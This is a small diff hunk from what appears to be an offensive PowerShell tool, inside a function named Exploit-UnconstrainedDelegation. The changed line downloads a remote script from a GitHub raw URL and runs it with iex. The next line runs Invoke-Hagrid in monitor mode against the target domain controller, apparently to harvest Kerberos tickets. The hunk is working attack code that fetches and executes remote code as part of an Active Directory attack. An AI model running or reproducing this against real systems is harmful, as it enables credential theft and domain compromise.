@@ -235,7 +235,7 @@ function Exploit-UnconstrainedDelegation {
 
         # Define future script block as a string
         $scriptBlock = @"
-$RubeusImport
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/y00ga-sec/Invoke-Hagrid.ps1/main/Invoke-Hagrid.ps1')
 Invoke-Hagrid -Command 'monitor /interval:5 /nowrap /targetuser:$TargetDCHostname'
 "@
 
